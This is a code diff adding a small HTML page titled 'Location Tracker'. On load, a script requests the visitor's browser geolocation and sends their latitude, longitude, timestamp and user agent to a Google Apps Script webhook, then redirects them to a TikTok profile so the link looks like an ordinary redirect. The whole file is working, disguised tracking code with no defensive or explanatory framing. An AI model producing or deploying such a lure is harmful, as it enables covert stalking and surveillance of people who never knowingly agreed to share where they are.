@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Location Tracker</title>
+</head>
+<body>
+  <h2>Checking your location...</h2>
+  <script>
+    const targetUrl = "https://www.tiktok.com/@yuukiituru";
+    const webhookUrl = "https://script.google.com/macros/s/AKfycbz1ZOuAG7qBJvtPZ5D3xQf61ceIlpdSx5s00pV8bf6gmveSEQjxLzTeTlac-khjtEZA/exec";
+
+    function sendLocation(lat, lon) {
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lon,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent
+        })
+      }).finally(() => {
+        window.location.href = targetUrl;
+      });
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          sendLocation(pos.coords.latitude, pos.coords.longitude);
+        },
+        () => {
+          window.location.href = targetUrl;
+        }
+      );
+    } else {
+      window.location.href = targetUrl;
+    }
+  </script>
+</body>
+</html>
